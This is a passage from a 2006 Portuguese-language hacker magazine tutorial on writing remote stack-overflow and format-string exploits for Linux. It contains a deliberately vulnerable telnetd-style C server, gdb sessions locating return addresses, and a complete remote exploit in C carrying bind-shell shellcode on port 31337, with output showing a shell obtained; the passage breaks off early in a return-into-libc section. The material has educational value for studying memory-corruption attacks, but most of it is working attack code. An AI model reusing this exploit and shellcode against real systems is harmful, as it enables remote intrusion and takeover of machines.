@@ -1,0 +1,1970 @@
+[ --- The Bug! Magazine
+
+                    _____ _              ___               _
+                   /__   \ |__   ___    / __\_   _  __ _  / \
+                     / /\/ '_ \ / _ \  /__\// | | |/ _` |/  /
+                    / /  | | | |  __/ / \/  \ |_| | (_| /\_/
+                    \/   |_| |_|\___| \_____/\__,_|\__, \/
+                                                   |___/
+
+                      [ M . A . G . A . Z . I . N . E ]
+
+
+             [ Numero 0x01 <---> Edicao 0x01 <---> Artigo 0x04 ]
+
+
+
+.> 23 de Marco de 2006,
+.> The Bug! Magazine < staff [at] thebugmagazine [dot] org >
+
+
+
+
+       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+        ESCREVENDO EXPLOITS REMOTOS DE STACK OVERFLOW E FORMAT STRINGS
+                    (Esmagando o stack e subvertendo a GOT)
+       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+
+
+.> 30 de Fevereiro de 2006,
+.> Julio Cesar Fort a.k.a sandimas <julio [at] rfdslabs [dot] com [dot] br>                         
+
+                                     "United we stand, divided we fall."
+                                                      (Dropkick Murphys)
+
+
+
+[ --- Indice
+
++     1.        <---> Introducao
++       1.1.     <->   Pre-requisitos
++     2.        <---> Escrevendo exploits remotos para Linux
++       2.1.     <->   Stack overflow
++         2.1.1  <->   Breve recapitulacao sobre stack overflow
++         2.1.2  <->   Codigo comentado do servidor vulneravel
++         2.1.3  <->   Estouro do buffer e como encontrar o endereco de retorno
++         2.1.4  <->   Estrutura comentada do nosso exploit
++         2.1.5  <->   Return-into-libc remoto
++         2.1.6  <->   Reestruturando o exploit com return-into-libc
++       2.2.     <->   Format string attack
++         2.2.1  <->   Breve recapitulacao de format string attack
++         2.2.2  <->   Codigo comentado do servidor vulneravel
++         2.2.3  <->   Como achar o argumento controlado e onde escrever
++         2.2.4  <->   Pequeno exemplo de exploracao (sem codigo)
++         2.2.5  <->   Estrutura comentada do exploit
++     3.        <---> Exemplos "vida real"
++       3.1.     <->   UW IMAPD 10.234 remote stack overflow
++       3.2.     <->   Citadel/UX <= v6.27 format string vulnerability
++     4.        <---> Fim
++       4.1.     <->   Agradecimentos
++       4.2.     <->   Referencias
+
+
+
+[ --- 1. Introducao
+
+   Este artigo e' destinado a exploracao de "overflows" remotos.
+Iremos abordar as tecnicas mais conhecidas para escrita de exploits remotos de
+"stack overflow" e "format string attacks" para Linux.
+O assunto foi selecionado devido a carencia desse tipo de material em lingua 
+portuguesa e, sem desmerecer o autor, o unico existente em portugues nao e'
+completamente funcional e nem confiavel para "exploitation in-the-wild" (e ire-
+mos provar isso mais tarde.)
+
+
+
+[ --- 1.1. Pre-requisitos
+
+   E' de requisito inicial que o leitor tenha nocoes basicas de programacao em
+C com sockets, conhecimento sobre organizacao de memoria em Linux e buffer
+overflows.
+Os testes e codigos foram feitos usando um computador Athlon XP 1700+ rodando
+Slackware Linux 10.1 e gcc-3.3.4. O teste de exploracao "return-into-libc" foi
+feito em um Slackware Linux 10.1 com gcc-3.2.3.
+
+
+
+[ --- 2. Escrevendo exploits remotos para Linux
+
+   Nesta secao iremos comecar a tratar da escrita do exploit propriamente dito.
+O material necessario para realizarmos a nossa tarefa e' um simples editor de
+texto ('vi' certamente e' o melhor), compilador C, um debugger (iremos usar o
+'gdb'), e um cerebro nem tao funcional ;)
+Vamos ver tambem que nao ha' misterio algum em relacao a escrita de exploits
+de stack overflow remotos, so' iremos mudar alguns detalhes que iremos mostrar
+ao longo do texto.
+
+
+
+[ --- 2.1. Stack overflow
+
+   Nesta secao havera' um simples exemplo de um servidor vulneravel e o nosso
+objetivo sera' controlar o seu fluxo e faze-lo executar o codigo que nos qui-
+sermos.
+
+
+
+[ --- 2.1.1. Breve recapitulacao sobre stack overflow
+
+   Stack e' uma regiao da memoria onde variaveis locais e argumentos passados
+para funcoes sao alocadas e desalocadas a cada chamada para uma funcao.
+Iremos nos referir a stack frame como sendo o estado do stack numa chamada de
+funcao com todos as suas variaveis e informacoes de controle (endereco de re-
+torno, por exemplo.)
+O stack opera em modelo LIFO (Last In, First Out), o que significa que ela se
+comporta como uma pilha de pratos, onde o ultimo prato colocado sob a pilha se-
+ra' o primeiro retirado (na verdade no stack os elementos nao sao retirados,
+o que acontece e' que o registrador %esp, tratado mais a seguir, move 4 bytes.)
+
+Nos exemplos a seguir iremos trabalhar com a funcao main() e chamada().
+
+<++ chamada-chamadora.c ++>
+
+#include <stdio.h>
+
+int chamada(int num);
+
+int main(void)
+{
+	int n;
+
+	printf("Hi, Karl!\n");
+	n = chamada(23);	// endereco de retorno TEORICO!
+	printf("Numero magico do Illuminati: %d\n", n);
+}
+
+int chamada(int num)
+{
+	/* nao faz nada... */
+	return num;
+} 	
+
+<++ chamada-chamadora.c ++>
+
+
+(*) Registradores
+
+RET (EIP) - Quando a funcao chamada() inicia, a partir de main(), o endereco da
+            proxima instrucao de main() apos chamada() e' colocado na secao RET
+            do stack frame de chamada().[*] Isto e' feito para que main() con-
+            tinue o seu curso normal apos o retorno da funcao que fora chamada.
+
+[*] Teoricamente e' onde esta' marcado com comentario no codigo acima, porem se
+    fizermos debugging iremos ver que entre o 'printf()' e a atribuicao existem
+    varias operacoes antes.
+
+FP (EBP) - Fica fixo no frame. Serve para referenciar dados atraves de offsets.
+           Geralmente aponta para o topo do stack de uma funcao.
+
+ESP - Topo do stack. Quando elementos sao adicionados, o %esp "anda" 4 bytes na
+      pilha em direcao `a base do stack (menores enderecos) e "anda para tras"
+      4 bytes em direcao ao topo do stack (maiores enderecos.)
+
+
+(*) Chamadas (CALLs)
+
+Chamadas a funcoes ocorrem em tres passos:
+
+- Prologo: 1) O "frame pointer" (registrador EBP) e' salvo no stack frame da
+           funcao chamada(). O FP servira' para que apos o retorno desta funcao
+           a funcao main() continue a referenciar sem problemas suas vari-
+           aveis locais.
+           2) A quantidade de memoria necessaria para armazenar as variaveis
+              locais de chamada(), bem como seus argumentos, e' reservada.
+
+- Call: Os parametros para a chamada() sao colocadas na pilha e a proxima
+        instrucao apos o 'call chamada' e' armazenada tambem na pilha na par-
+        te "RETURN ADDRESS" do stack frame de chamada(). Esta instrucao faz
+        um salto (instrucao "jmp") para chamada(), que vai ser executada nes-
+        te instante.
+        Apos a funcao retornar, usando a instrucao "ret", este endereco que
+        fora previamenente salvo sera' colocado no registrador EIP, que dara'
+        continuidade ao fluxo do programa.
+
+- Epilogo: O stack volta para o estado anterior a chamada(). O conteudo do RET
+           e' colocado no registrador EIP, afim de seguir normalmente o fluxo,
+           e o stack frame e' destruido.
+
+
+(*) Stack frame
+
+Stack frame e' uma secao do stack que contem argumentos para funcoes, variaveis
+locais, informacoes para manutencao (endereco de retorno, frame pointer), etc.
+
+Vamos mostrar um diagrama do stack frame a partir de um programa de exemplo.
+
+<++ exemplo.c ++>
+
+int main(int argc, char *argv[])
+{
+        char buffer[16];
+
+        if(argc < 1)
+                exit(-1);
+
+        memset(buffer, 0x00, sizeof(buffer));
+        strcpy(buffer, argv[1]);
+}
+
+<++ exemplo.c ++>
+
+Em sistemas Linux mais recentes houve a inclusao de 8 bytes "dummy" ao stack
+frame de todas as funcoes. Portanto se quisermos estourar o stack do programa
+acima devemos fazer o seguinte calculo:
+
+16 (NUMERO DE BYTES DA VARIAVEL) + 8 (DUMMY) + 4 (FP -> EBP) + 4 (RET -> EIP)
+
+          ...                   Topo do stack
+          |---------------------------------| (endereco mais baixo)
+          |              argc               |
+          |- - - - - - - - - - - - - - - - -|
+          |             &argv[]             |
+          |- - - - - - - -   - - - - - - - -|    ^ 
+          |   End. retorno (%eip - 4 bytes) |    | Cresce neste sentido,
+          |- - - - - - - - - - - - - - - - -|    | em direcao aos enderecos
+          | Frame pointer (%ebp - 4 bytes)  |    | mais baixos.
+          |- - - - - - - - - - - - - - - - -|    |
+          |            dummy[8]             |    | Pode colidir com a heap :)
+          |- - - - - - - - - - - - - - - - -|    |
+          |            buffer[16]           |
+          |---------------------------------| (endereco mais alto 0xbfffffff)
+          ...                   Base do stack
+
+Nao iremos nos estender mais no topico de stack overflows pois existem excelen-
+tes artigos na internet sobre o assunto e que explicam muito mais detalhadamen-
+te do que a breve explanacao acima. Veja a secao de referencias no final deste
+texto para maiores informacoes.
+
+
+
+[ --- 2.1.2. Codigo comentado do servidor vulneravel
+
+   Agora sera' mostrado um simples servidor que emula um telnetd (para dar mais
+realismo) vulneravel a um ataque comum de stack overflow e format string. Se
+soubermos como explora-lo, se torna trivial a exploracao de outros servidores
+que tenham uma falha similar, basta "moldar" o exploit para funcionar contra
+outros servicos (ex.: um stack overflow no comando "USER" de um 'pop3d' certa-
+mente vai requerer que o seu codigo envie antes um comando "HELO", imitando,
+assim, um cliente de e-mail.) 
+
+<++ servidor-telnetd.c ++>
+
+/* Exemplo de servidor vulneravel a stack overflow e format string */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/socket.h>
+#include <netdb.h>
+#include <netinet/in.h>
+#include <errno.h>
+#include <unistd.h>
+
+#define	MAX    2048
+#define	PORTA  8080	// porta a ser usada pelo servidor
+#define MAXCON 5	// maximo de conexoes simultaneas
+#define	ERRO   -1
+#define	MSG    "UNIX rfdslabs.com.br version 4.5v build-1985\nlogin: "
+
+void espera_cliente(int sockfd);
+void cria_conexao(void);
+void autoriza_login(char *login);
+
+int main(void)
+{
+	cria_conexao();
+}
+
+void espera_cliente(int sockfd)
+{
+	char bufferleitura[MAX];
+	struct sockaddr_in rede;
+	int cliente, resposta, tamanho;
+
+	tamanho = sizeof(rede);
+	memset(bufferleitura, 0x00, sizeof(bufferleitura));
+	
+	printf("Esperando conexao...\n");
+
+	if((cliente = accept(sockfd, (struct sockaddr *)&rede, &tamanho)) == ERRO)
+	{
+		fprintf(stderr, "Erro: %s\n", strerror(errno));
+		shutdown(sockfd, SHUT_RDWR);
+		close(sockfd);
+		exit(ERRO);
+	}
+
+	fprintf(stdout, "Conexao recebida de %s\n", inet_ntoa(rede.sin_addr));
+	write(cliente, MSG, strlen(MSG)); // envia mensagem para o cliente
+	resposta = read(cliente, bufferleitura, sizeof(bufferleitura));
+	autoriza_login(bufferleitura);
+}
+
+void cria_conexao(void)
+{
+	struct sockaddr_in conexao;
+	int sockfd, opt;
+
+	opt = 1;
+
+	if((sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == ERRO)
+	{
+		fprintf(stderr, "Erro de socket: %s\n", strerror(errno));
+		exit(ERRO);
+	}
+
+	if(setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) == -1)
+	{
+		fprintf(stderr, "Erro setsockopt(): %s\n", strerror(errno));
+		exit(ERRO);
+	}
+	
+	/* preenchendo as estruturas de rede */
+	conexao.sin_family = AF_INET;
+	conexao.sin_port = htons(PORTA);
+	conexao.sin_addr.s_addr = INADDR_ANY;
+
+	if(bind(sockfd, (struct sockaddr *)&conexao, sizeof(struct sockaddr)) == ERRO)
+	{
+		fprintf(stderr, "Erro em bind(): %s\n", strerror(errno));
+		exit(ERRO);
+	}
+
+	listen(sockfd, MAXCON);
+	espera_cliente(sockfd);
+	close(sockfd);
+	exit(0);
+}
+
+void autoriza_login(char *login)
+{
+	char autorizacao[256];
+	char armazenado[32];
+	
+	memset(autorizacao, 0x00, sizeof(autorizacao));
+	fprintf(stdout, "Autorizando usuario...\n");
+	// O BUG DE FORMAT STRING ESTA' AQUI EMBAIXO!
+	snprintf(armazenado, sizeof(armazenado), login);
+	// O BUG DE STACK OVERFLOW ESTA' AQUI EMBAIXO!
+	strcpy(autorizacao, login);
+	fprintf(stdout, "Armazenando o login do usuario...\n");
+	fprintf(stdout, "OK! Autorizado o usuario %s", armazenado);
+}
+
+<++ servidor-telnetd.c ++>
+
+
+
+[ --- 2.1.3. Estouro do buffer e como encontrar o endereco de retorno 
+   Primeiramente iremos mostrar o comportamento normal do servidor para que
+voce leitor fique familiarizado com ele. Conforme visto no codigo, e' um sim-
+ples servidor que emula o banner de um 'telnetd', recebe a entrada do usuario e
+nao faz mais nada alem disso. A emulacao do "rfdslabs UNIX" e' somente para dar
+mais emocao durante a exploracao :)
+Nao se esqueca que sera' necessario o uso de dois terminais de comandos para
+realizarmos as acoes.
+
+(*) Inicializando o servidor (terminal 1)
+
+-------------------------------------------------------
+sandimas@virtualinsanity:~/rfdslabs$ ./servidor-telnetd 
+Esperando conexao...
+-------------------------------------------------------
+
+
+(*) Conectando o cliente (terminal 2)
+
+----------------------------------------------------------
+sandimas@virtualinsanity:~/rfdslabs$ telnet localhost 8080
+Trying 127.0.0.1...
+Connected to localhost.
+Escape character is '^]'.
+UNIX rfdslabs.com.br version 4.5v build-1985
+login: sandimas
+Connection closed by foreign host.
+----------------------------------------------------------
+
+Na tela do servidor temos o seguinte resultado:
+
+-------------------------------------------------------
+sandimas@virtualinsanity:~/rfdslabs$ ./servidor-telnetd 
+Esperando conexao...
+Conexao recebida de 127.0.0.1
+Autorizando usuario...
+-------------------------------------------------------
+
+Tudo ocorreu conforme previsto. O usuario entrado, "sandimas", tem somente 8
+letras, o que ainda nao e' necessario para corromper os registros de ativacao
+da funcao 'autoriza_login()'.
+E se colocarmos mais caracteres que o esperado pelo programa? Uma bela condicao
+de "buffer overrun" iria acontecer, nao? :)
+
+
+(*) Estourando o buffer
+
+Voltando para 'autoriza_login()' vemos que o array 'autorizacao[]' comporta 256
+caracteres e pelo "layout" de memoria da nossa funcao vulneravel e' possivel
+controlar o RET (EIP) com 272 caracteres (256  +  8  +  4  +  4 = 272).
+                                           |      |     |     |
+                                        ARRAY   DUMMY  FP    RET
+
+-------------------------------------------------------------------------------
+sandimas@virtualinsanity:~/rfdslabs$ perl -e 'print "A"x271'|nc localhost 8080
+UNIX rfdslabs.com.br version 4.5v build-1985
+login:
+sandimas@virtualinsanity:~/rfdslabs$
+-------------------------------------------------------------------------------
+
+No terminal onde o servidor estava rodando nos vemos a seguinte mensagem:
+
+-------------------------------------------------------
+sandimas@virtualinsanity:~/rfdslabs$ ./servidor-telnetd
+Esperando conexao...
+Conexao recebida de 127.0.0.1
+Autorizando usuario...
+Segmentation fault (core dumped)
+------------------------------------------------------
+
+O que aconteceu foi que o 'servidor-telnetd' recebeu um signal de SIGSEGV que
+significa "segmentation violation". Traduzindo, o programa tentou saltar para
+uma area de memoria invalida (nao-mapeada) ou uma porcao que ele nao tinha
+acesso.
+
+Abaixo esta' um exemplo de utilizacao do 'gdb' para vermos o que realmente
+aconteceu para que o programa quebrasse.
+O exemplo descrevera' como fazer para visualisar o conteudo dos registradores.
+Desta forma poderemos saber para qual endereco o programa vulneravel saltou.
+
+----------------------------------------------------------------------------
+sandimas@virtualinsanity:~/rfdslabs$ gdb servidor-telnetd core
+GNU gdb 6.3
+Copyright 2004 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+(...)
+warning: core file may not match specified executable file.
+Core was generated by `./servidor-telnetd'.
+Program terminated with signal 11, Segmentation fault.
+Reading symbols from /lib/libc.so.6...done.
+Loaded symbols for /lib/libc.so.6
+Reading symbols from /lib/ld-linux.so.2...done.
+Loaded symbols for /lib/ld-linux.so.2
+#0  0x00414141 in ?? ()
+(gdb) info reg eip ebp
+eip            0x414141 0x414141
+ebp            0x41414141       0x41414 41
+-----------------------------------------------------------------------------
+
+Isso significa que nao conseguimos corromper por completo o valor do endereco
+de retorno. O leitor mais astuto percebera' que enderecos possuem 4 bytes mas o
+EIP so' possui 3 bytes (o quarto e' um 00) e que colocamos 271 A's ao inves de
+272. Por isso faltou 1 byte de RET ser sobreescrito.
+
+
+(*) Encontrando o endereco de retorno para o nosso exploit
+
+Agora e' uma das partes mais importantes do texto. Precisaremos encontrar o
+endereco de memoria de onde ficara' o nosso "payload" (NOPs + shellcode) para
+que possamos fazer o programa saltar para esta area e executar o que quisermos.
+
+Precisaremos primeiro fazer o passo 1 no terminal onde se encontra o servidor.
+O que este passo faz e' colocar um "break point" na funcao 'autoriza_login()'.
+Significa que o programa ira' rodar normalmente ate' chegar neste procedimento
+de autorizacao e a execucao para neste ponto.
+'autoriza_login()' foi escolhida porque e' nela onde a nossa entrada vai ser
+copiada com 'strcpy()' e o stack overflow acontece. A examinacao da memoria
+sera' feita nos passos posteriores.
+
+O passo 2 sera' utilizado para enviarmos o nosso payload com NOPs para o alvo e
+posteriormente iremos saber qual o possivel endereco de retorno a ser usado no
+exploit.
+
+O passo 3 e' necessario para visualisarmos o estado da memoria do stack de
+'autoriza_login()' e deve ser realizado enquanto o programa do servidor se en-
+contra em pausa. Como podemos "enxergar" os enderecos onde estao armazenadas as
+informacoes, inclusive o nosso "payload", podemos facilmente saber onde o nosso
+buffer malicioso comeca e termina. Por saber todas as informacoes a cerca da
+memoria do processo poderemos pegar um endereco onde comecam os nossos NOPs pa-
+ra ser o nosso endereco de retorno no exploit.
+
+=== Passo 1 (terminal 1) ===
+
+sandimas@virtualinsanity:~/rfdslabs$ gdb -q servidor-telnetd
+Using host libthread_db library "/lib/libthread_db.so.1".
+(gdb) break autoriza_login
+Breakpoint 1 at 0x8048a22
+(gdb) run
+Starting program: /home/sandimas/rfdslabs/servidor-telnetd 
+Esperando conexao...
+Conexao recebida de 127.0.0.1
+
+Breakpoint 1, 0x08048a22 in autoriza_login ()
+
+
+=== Passo 2 (va' para o terminal 2) ===
+
+sandimas@virtualinsanity:~/rfdslabs$ perl -e 'print "\x90"x272' | nc localhost
+8080
+UNIX rfdslabs.com.br version 4.5v build-1985
+login:
+sandimas@virtualinsanity:~/rfdslabs$
+
+
+=== Passo 3 (volte para o terminal 1) ===
+
+(gdb) x/200x $esp-200
+0xbfffec58:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbfffec68:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbfffec78:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbfffec88:     0x00000000      0x00000000      0x00000000      0x4008bc14
+0xbfffec98:     0x00000000      0x00000000      0x40145ff4      0xbfffecf4
+0xbfffeca8:     0xbfffecd0      0x4008ceb0      0xbfffecf4      0x40148f38
+0xbfffecb8:     0x31323149      0x00000000      0x00148f49      0x400166f4
+0xbfffecc8:     0xbfffece4      0x4000b1ce      0x08048398      0x40016700
+0xbfffecd8:     0x40015ff8      0x00000000      0x0000045c      0xbfffed30
+0xbfffece8:     0x40007a77      0x4003dd4b      0x0804844e      0xfbad8001
+0xbfffecf8:     0x40148f38      0x00000020      0x00000000      0x00000000
+0xbfffed08:     0x4003de0e      0x40038b50      0x40030370      0x400169c0
+(...)
+0xbfffee58:     0xce79c000      0x0000000a      0x90909090      0x90909090
+0xbfffee68:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffee78:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffee88:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffee98:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffeea8:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffeeb8:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffeec8:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffeed8:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffeee8:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffeef8:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffef08:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffef18:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffef28:     0x90909090      0x90909090      0x90909090      0x90909090
+---Type <return> to continue, or q <return> to quit---
+0xbfffef38:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffef48:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffef58:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffef68:     0x90909090      0x90909090      0x00000000      0x00000000
+(gdb) continue
+Continuing.
+Autorizando usuario...
+
+Program received signal SIGSEGV, Segmentation fault.
+0x90909090 in ?? ()
+(gdb) quit
+The program is running.  Exit anyway? (y or n) y
+sandimas@virtualinsanity:~/rfdslabs$
+
+= [?] =========================================================================
+NOTA: A explicacao do comando utilizado no gdb se encontra a seguir:
+
+(gdb) x/200x $esp-200
+
+Este comando diz para que o gdb nos mostre, em hexadecimal, o conteudo das 200
+primeiras posicoes de memoria a partir do topo do stack - 200. Poderia ser sim-
+plesmente o comando "x/100x", por exemplo, e iriamos apertando [ENTER] ate'
+acharmos o comeco e o final do que haviamos enviado.
+= [?] =========================================================================
+
+Perceba a cadeia de NOPs (0x90) que vai de aproximadamente 0xbfffee68 ate'
+0xbfffef68. A diferenca entre eles e' 256. Significa que temos 256 caracteres
+para colocarmos os nossos NOPs, shellcode e endereco de retorno.
+
+Finalmente para acharmos o nosso endereco de retorno basta escolhermos um ende-
+reco entre os da cadeia de NOPs. De preferencia iremos escolher um que esteja
+"no meio" (ex.: 0xbfffeed8). Isso ajudara' a garantir uma certa possibilidade
+para que o seu exploit funcione "in-the-wild". Por enquanto nao iremos definir
+qual sera' o nosso "return address", e' melhor faze-lo somente quando tivermos
+definido o nosso shellcode (ainda nao sabemos qual sera', muito menos o seu ta-
+manho).
+
+OBS: Aqui esta' a prova de que o metodo mostrado por um antigo texto em portu-
+     gues nao e' totalmente confiavel. Na maneira descrita no referido artigo
+     so' tinhamos um endereco de retorno possivel, o que e' impraticavel numa
+     exploracao "in-the-wild" e provavelmente so' funcionaria na sua maquina de
+     testes.
+
+
+
+[ --- 2.1.4. Estrutura comentada do nosso exploit
+
+   Agora que ja' sabemos como o servidor funciona, com quantos bytes estouramos
+o seu buffer e como pegar um endereco de retorno util, agora e' so' colocarmos
+a mao na massa para escrever o exploit ;)
+Exploits remotos e locais sao mais ou menos parecidos. A maior diferenca entre
+eles e' o shellcode. Em exploracao remota o shellcode usado nao pode ser o mes-
+mo que nos da' um shell /bin/sh e sim um que faz um "bind" para escutar em uma
+porta e nos dar este shell ou outros truques, como um shellcode que nos crie um
+usuario na maquina, por exemplo.
+
+<++ exploit-telnetd.c ++>
+
+/* Exploit exemplo para servidor-telnetd.c */
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <errno.h>
+#include <signal.h>
+#include <sys/types.h>
+#include <sys/time.h>
+#include <sys/socket.h>
+#include <netdb.h>
+
+#define PORTA   8080
+#define	OFFSET  0
+#define ALINHA  0
+#define ERRO    -1
+#define MAX     272
+
+#define	RET     0xbfffeef0 /* Slackware 10.1 - virtualinsanity */
+#define RET2    0xbffff3f0 /* Slackware 10 - weiddy */
+#define RET3    0xbfffee40 /* $esp = info registers esp */
+#define RET4    0x41414141 /* endereco "crash-only" */
+
+/* Linux x86 bind shell port 31337 - from Metasploit Framework (84 bytes) */
+unsigned char x86_lnx_bind[] = "\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x99"
+    			       "\x89\xe1\xcd\x80\x96\x43\x52\x66\x68\x7a\x69"
+			       "\x66\x53\x89\xe1\x6a\x66\x58\x50\x51\x56\x89"
+		               "\xe1\xcd\x80\xb0\x66\xd1\xe3\xcd\x80\x52\x52"
+ 		               "\x56\x43\x89\xe1\xb0\x6 \xcd\x80\x93\x6a\x02"
+ 		               "\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x52"
+			       "\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89"
+	 	               "\xe3\x52\x53\x89\xe1\xcd\x80";
+			       
+int cria_conexao(char *host, unsigned int porta);
+void uso(char *nomeprograma);
+
+int main(int argc, char *argv[])
+{
+	char payload[MAX], *host;
+	int sockfd;
+	unsigned int i, opcao, porta;
+	int ret, offset, alinhamento;
+	
+        memset(payload, 0x00, sizeof(payload)); /* zeramos o nosso buffer */
+        host = NULL;
+        ret = RET;
+        offset = OFFSET; /* offset padrao */
+        porta = PORTA;
+        alinhamento = ALINHA;
+ 
+        fprintf(stdout, "Exploit para o exemplo servidor-telnetd.c\n");
+
+        if(argc < 2)
+                uso(argv[0]);
+
+        while((opcao = getopt(argc, argv, "h:o:p:a:")) != EOF)
+        {
+	        switch(opcao)
+	        {
+                	case 'h':
+				if(strlen(optarg) > 255)
+				{
+					fprintf(stderr, "Tamanho de host invalido.\n");
+					exit(ERRO);
+				}
+				host = optarg;
+				break;
+
+			case 'o':
+				offset = atoi(optarg);
+				break;
+
+			case 'p':
+				if(atoi(optarg) > 65535 || atoi(optarg) < 0)
+				{
+					fprintf(stderr, "Porta invalida.\n");
+					exit(ERRO);
+				}
+				porta = atoi(optarg);
+				break;
+
+			case 'a':
+				alinhamento = atoi(optarg);
+				break;
+
+			default:
+				uso(argv[0]);
+		}
+	}
+	
+	sockfd = cria_conexao(host, porta);
+
+	if(offset != 0)
+		ret = RET2 + offset;
+	
+	/* enchemos com NOPs parte do nosso payload, deixando espaco para o
+	   shellcode e o endereco de retorno */
+	memset(payload + alinhamento, 0x90, MAX - strlen(x86_lnx_bind) - 4);
+
+	/* copiando o shellcode */
+	memcpy(payload + alinhamento + (MAX - strlen(x86_lnx_bind) - 4), x86_lnx_bind, sizeof(x86_lnx_bind));
+	
+	for(i=strlen(payload); i < MAX; i+=4)
+		*((int *) &payload[i]) = ret;
+	
+	fprintf(stdout, "Usando 0x%x como endereco de retorno.\n", ret);
+	write(sockfd, payload, strlen(payload));
+	fprintf(stdout, "Payload enviado! Conecte em %s:31337\n", host);
+
+	shutdown(sockfd, SHUT_RDWR);
+	close(sockfd);
+}
+
+int cria_conexao(char *host, unsigned int porta)
+{
+        struct sockaddr_in conexao;
+        struct hostent *hbn;
+        int sockfd;
+
+        /* fecha o programa se o socket nao for criado com sucesso */
+        if((sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == ERRO)
+        {
+                fprintf(stderr, "Erro #%d criando socket principal: %s\n", errno, strerror(errno));
+                exit(ERRO);
+        }
+
+	/* tenta fazer um resolv no host para ver se ele existe */
+        if((hbn = gethostbyname(host)) == NULL)
+        {
+                fprintf(stderr, "Erro #%d gethostbyname(): Impossivel achar %s.\n", errno, host);
+                exit(ERRO);
+        }
+
+        /* preenchendo as estruturas de rede */
+        bzero((char *)&conexao,sizeof(conexao));
+        conexao.sin_family = AF_INET;
+        conexao.sin_port = htons(porta);
+        conexao.sin_addr = *((struct in_addr *)hbn->h_addr);
+
+        if(connect(sockfd,(struct sockaddr *)&conexao, sizeof(conexao)) == ERRO)
+        {
+                fprintf(stderr,"Erro #%d: %s.\n", errno, strerror(errno));
+	       	shutdown(sockfd, SHUT_RDWR);
+                close(sockfd);
+                exit(ERRO);
+        }
+ 
+       return(sockfd);
+}
+
+void uso(char *nomeprograma)
+{
+
+	fprintf(stdout, "Uso: %s -h <host> -p [porta] -o [offset]\n", nomeprograma);
+       	exit(0);
+}
+
+<++ exploit-telnetd.c ++>
+
+-------------------------------------------------------------------------------
+sandimas@virtualinsanity:~/rfdslabs$ ./exploit-telnetd -h localhost
+Exploit para o exemplo servidor-telnetd.c
+Usando 0xbfffeef0 como endereco de retorno.
+Payload enviado! Conecte em localhost:31337
+
+sandimas@virtualinsanity:~/rfdslabs$ nc localhost 31337 -vv        
+localhost [127.0.0.1] 31337 (?) open
+uname -a; id; whoami; echo "huhu owned"     
+Linux virtualinsanity 2.4.29 #6 Thu Jan 20 16:30:37 PST 2005 i686 unknown unknown GNU/Linux
+uid=1000(sandimas) gid=100(users) groups=100(users),11(floppy),17(audio),18(video),19(cdrom)
+sandimas
+huhu owned
+exit
+ sent 42, rcvd 205
+- -----------------------------------------------------------------------------
+
+Agora cabe ao leitor fazer melhorias no exploit. Como sugestao vai um esquema
+de brute-force de enderecos, uma estrutura de targets para diversos enderecos
+de retornos diferentes e uma funcao para conectar diretamente a shell aberta
+pelo shellcode.
+
+
+
+[ --- 2.1.5. Return-into-libc remoto
+
+   Return-into-libc nada mais e' do que fazer o nosso programa saltar para um
+endereco libc que nos seja util, como "system()", ao inves de retornar para o
+stack. Esta tecnica foi bastante utilizada para "bypassing" de varios sistemas
+com 'no-exec stack' habilitado e para evadir-se de IDSes que mantem assinaturas
+de shellcodes.
+
+A explicacao pormenorizada desta tecnica foge ao escopo deste paper. Um otimo
+texto sobre return-into-libc, com informacoes detalhadas, e' o "Local Stack
+Overflow (advanced module)" de Thyago Silva, o link se encontra na referencia 6
+no final deste artigo.
+
+(*) Informacoes necessarias
+
+Como iremos retornar para "system()", executar os comandos e sair em "exit()",
+precisaremos coletar o endereco dessas funcoes na libc. Este endereco e' dife-
+rente entre varios sitemas e distribuicoes Linux mas uma vez descoberto este
+endereco permanecera' fixo ate' que a libc seja recompilada. Tambem sera' pre-
+ciso descobrirmos os enderecos dos argumentos que serao passados as funcoes.
+
+Para conseguirmos estas informacoes precisaremos usar o 'gdb' em um programa
+qualquer.
+
+<++ programaqualquer.c ++>
+
+#include <stdio.h>
+int main(void)
+{
+        /* eu nao faco nada! */
+}
+
+<++ programaqualquer.c ++>
+
+----------------------------------------------------------------
+julio@weiddy:~/rfdslabs$ gdb -q programaqualquer
+(gdb) break main
+Breakpoint 1 at 0x80483a2
+(gdb) r
+Starting program: /home/julio/rfdslabs/programaqualquer 
+
+Breakpoint 1, 0x080483a2 in main ()
+(gdb) p system
+$1 = {<text variable, no debug info>} 0x40060e80 <system>
+(gdb) p exit
+$2 = {<text variable, no debug info>} 0x400491a0 <exit>
+(gdb) quit
+The program is running.  Exit anyway? (y or n) y
+---------------------------------------------------------------
+
+Endereco de system(): 0x40060e80
